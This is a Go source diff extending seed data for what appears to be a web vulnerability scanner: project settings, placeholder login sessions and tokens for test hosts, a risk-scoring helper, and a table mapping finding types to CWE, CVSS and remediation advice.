+			AllowedEmails:  []string{"analyst@vigolium.dev"},
+			DefaultTarget:  "https://blog.test",
+			LastScanAt:     now.Add(-10 * time.Minute),
+			CreatedAt:      now.Add(-3 * 24 * time.Hour),
+			UpdatedAt:      now.Add(-3 * time.Hour),
 		},
 		{
-			UUID:        "proj-0004-aaaa-bbbb-cccc-ddddeeee0004",
-			Name:        "CI Nightly Scan",
-			Description: "Automated nightly security scans triggered by CI pipeline",
-			OwnerUUID:   users[2].UUID,
-			CreatedAt:   now.Add(-1 * 24 * time.Hour),
-			UpdatedAt:   now.Add(-12 * time.Hour),
+			UUID:           "proj-0004-aaaa-bbbb-cccc-ddddeeee0004",
+			Name:           "CI Nightly Scan",
+			Description:    "Automated nightly security scans triggered by CI pipeline",
+			OwnerUUID:      users[2].UUID,
+			ConfigPath:     "~/.vigolium/projects/ci-nightly.yaml",
+			Tags:           []string{"ci", "automated", "nightly"},
+			AllowedDomains: []string{"*.example.com", "*.shop.local"},
+			AllowedEmails:  []string{"ci-bot@vigolium.dev"},
+			DefaultTarget:  "https://example.com",
+			LastScanAt:     now.Add(-12 * time.Hour),
+			CreatedAt:      now.Add(-1 * 24 * time.Hour),
+			UpdatedAt:      now.Add(-12 * time.Hour),
 		},
 	}
 }
@@ -2657,7 +2978,7 @@ func seedSessionHostnames(scans []*database.Scan) []*database.SessionHostname {
 			CreatedAt:    now.Add(-2 * time.Hour),
 			UpdatedAt:    now.Add(-2 * time.Hour),
 		},
-		// api.shop.local — authenticated session via login flow
+		// api.shop.local — authenticated session via login flow (token extracted)
 		{
 			Hostname:         "api.shop.local",
 			ScanUUID:         scans[1].UUID,
@@ -2670,12 +2991,15 @@ func seedSessionHostnames(scans []*database.Scan) []*database.SessionHostname {
 			LoginBody:        `{"username":"admin","password":"admin123"}`,
 			LoginRequest:     "POST /api/v1/auth/login HTTP/1.1\r\nHost: api.shop.local\r\nContent-Type: application/json\r\n\r\n{\"username\":\"admin\",\"password\":\"admin123\"}",
 			LoginResponse:    "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"token\":\"eyJhbGciOiJIUzI1NiJ9.shop-admin-token\",\"expires_in\":3600}",
+			SessionToken:     "eyJhbGciOiJIUzI1NiJ9.shop-admin-token",
+			Headers:          map[string]string{"Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.shop-admin-token"},
 			ExtractRules:     `[{"source":"body","name":"token","type":"json","expression":"$.token","apply_as":"header","header_name":"Authorization","header_prefix":"Bearer "}]`,
 			Source:           "agent",
+			HydratedAt:       ptrTime(now.Add(-85 * time.Minute)),
 			CreatedAt:        now.Add(-90 * time.Minute),
-			UpdatedAt:        now.Add(-90 * time.Minute),
+			UpdatedAt:        now.Add(-85 * time.Minute),
 		},
-		// api.shop.local — regular customer session
+		// api.shop.local — regular customer session (token extracted)
 		{
 			Hostname:         "api.shop.local",
 			ScanUUID:         scans[1].UUID,
@@ -2686,10 +3010,13 @@ func seedSessionHostnames(scans []*database.Scan) []*database.SessionHostname {
 			LoginMethod:      "POST",
 			LoginContentType: "application/json",
 			LoginBody:        `{"username":"customer1","password":"custpass"}`,
+			SessionToken:     "eyJhbGciOiJIUzI1NiJ9.shop-customer-token",
+			Headers:          map[string]string{"Authorization": "Bearer eyJhbGciOiJIUzI1NiJ9.shop-customer-token"},
 			ExtractRules:     `[{"source":"body","name":"token","type":"json","expression":"$.token","apply_as":"header","header_name":"Authorization","header_prefix":"Bearer "}]`,
 			Source:           "agent",
+			HydratedAt:       ptrTime(now.Add(-88 * time.Minute)),
 			CreatedAt:        now.Add(-90 * time.Minute),
-			UpdatedAt:        now.Add(-90 * time.Minute),
+			UpdatedAt:        now.Add(-88 * time.Minute),
 		},
 		// blog.test — cookie-based session
 		{
@@ -2722,6 +3049,50 @@ func seedSessionHostnames(scans []*database.Scan) []*database.SessionHostname {
 // ---------------------------------------------------------------------------
 // Helpers
 // ---------------------------------------------------------------------------
+
+func ptrTime(t time.Time) *time.Time {
+	return &t
+}
+
+func hasAuthHeader(headers map[string][]string) bool {
+	for name := range headers {
+		lower := strings.ToLower(name)
+		if lower == "authorization" || lower == "cookie" || lower == "x-api-key" {
+			return true
+		}
+	}
+	return false
+}
+
+// computeRiskScore maps remarks and status to a 0–100 risk hint for sorting.
+func computeRiskScore(remarks []string, status int) int {
+	score := 0
+	for _, r := range remarks {
+		switch {
+		case strings.HasPrefix(r, "sqli"):
+			score += 40
+		case strings.HasPrefix(r, "xss"):
+			score += 30
+		case strings.HasPrefix(r, "lfi"):
+			score += 35
+		case strings.HasPrefix(r, "open-redirect"):
+			score += 15
+		case strings.Contains(r, "forbidden-bypass"), strings.Contains(r, "admin"):
+			score += 20
+		case strings.Contains(r, "data-leak"):
+			score += 25
+		default:
+			score += 5
+		}
+	}
+	if status == 500 {
+		score += 10
+	}
+	if score > 100 {
+		score = 100
+	}
+	return score
+}
 
 func buildRawRequest(method, path, hostname string, port int, scheme string, headers map[string][]string, body []byte) []byte {
 	var b strings.Builder
@@ -3360,4 +3731,82 @@ func generateHTMLSeedBody(ep seedEndpoint, hostPort string) []byte {
 func hashStr(data []byte) string {
 	h := sha256.Sum256(data)
 	return fmt.Sprintf("%x", h[:16]) // 32 hex chars
+}
+
+// moduleClassification maps module IDs to CWE / CVSS / remediation so findings
+// can be enriched centrally rather than repeating the info in every seed row.
+type moduleClassification struct {
+	CWE         string
+	CVSS        float64
+	Remediation string
+}
+
+var findingClassification = map[string]moduleClassification{
+	"xss-reflected-param":       {"CWE-79", 6.1, "Context-aware encode user input before rendering into HTML, JS, URL, or CSS sinks. Prefer an auto-escaping template engine."},
+	"sqli-union-based":          {"CWE-89", 9.8, "Use parameterized queries or prepared statements. Never build SQL via string concatenation on user input."},
+	"sqli-error-based":          {"CWE-89", 8.1, "Use parameterized queries and disable verbose database errors in production responses."},
+	"lfi-path-traversal":        {"CWE-22", 8.6, "Canonicalize paths and restrict file access to an allowlist. Reject inputs containing '..' or absolute paths."},
+	"ssti-expression-eval":      {"CWE-94", 8.5, "Use sandboxed template engines; never pass untrusted input into templating syntax."},
+	"crlf-header-injection":     {"CWE-93", 5.4, "Strip CR/LF characters from any user input used in HTTP response headers or cookies."},
+	"open-redirect":             {"CWE-601", 4.3, "Validate redirect destinations against a domain allowlist or use a mapping table of safe targets."},
+	"info-server-version":       {"CWE-200", 3.1, "Suppress version banners (Server, X-Powered-By) and upgrade to supported server versions."},
+	"info-missing-headers":      {"CWE-693", 0.0, "Add X-Content-Type-Options, X-Frame-Options, and Content-Security-Policy response headers."},
+	"info-sensitive-data":       {"CWE-200", 5.3, "Remove sensitive fields (API keys, tokens, secrets) from API response schemas."},
+	"backslash-transformation":  {"CWE-707", 0.0, "Escape sequence interpretation is a behavioural signal — manually confirm if it points to injection."},
+	"suspect-transform":         {"CWE-707", 0.0, "Server-side evaluation of arithmetic expressions is a behavioural signal — confirm with targeted payloads."},
+	"smart-behavior-detection":  {"CWE-707", 0.0, "Differential timing/response is a behavioural signal — follow up with targeted injection probes."},
+}
+
+// enrichFindings hydrates denormalized and classification fields based on the
+// referenced HTTP record and the finding's module ID.
+func enrichFindings(findings []*database.Finding, records []*database.HTTPRecord) {
+	byUUID := make(map[string]*database.HTTPRecord, len(records))
+	for _, r := range records {
+		byUUID[r.UUID] = r
+	}
+	for _, f := range findings {
+		if len(f.HTTPRecordUUIDs) > 0 {
+			if r, ok := byUUID[f.HTTPRecordUUIDs[0]]; ok {
+				if f.URL == "" {
+					f.URL = r.URL
+				}
+				if f.Hostname == "" {
+					f.Hostname = r.Hostname
+				}
+				if f.ScanUUID == "" {
+					f.ScanUUID = r.ScanUUID
+				}
+			}
+		}
+		if c, ok := findingClassification[f.ModuleID]; ok {
+			if f.CWEID == "" {
+				f.CWEID = c.CWE
+			}
+			if f.CVSSScore == 0 {
+				f.CVSSScore = c.CVSS
+			}
+			if f.Remediation == "" {
+				f.Remediation = c.Remediation
+			}
+		}
+		if f.Status == "" {
+			f.Status = database.StatusTriaged
+		}
+	}
+	// Exercise the lifecycle: agent-sourced findings land as draft awaiting
+	// triage; the missing-headers passive finding is accepted risk and one
+	// behavioural suspect was triaged as a false positive.
+	for _, f := range findings {
+		switch f.ModuleID {
+		case "info-missing-headers":
+			f.Status = database.StatusAcceptedRisk
+		case "smart-behavior-detection":
+			f.Status = database.StatusFalsePositive
+		case "sqli-union-based":
+			f.Status = database.StatusTriaged
+		}
+		if f.FindingSource == database.FindingSourceAgent || f.FindingSource == database.FindingSourceArchon {
+			f.Status = database.StatusDraft
+		}
+	}
 }
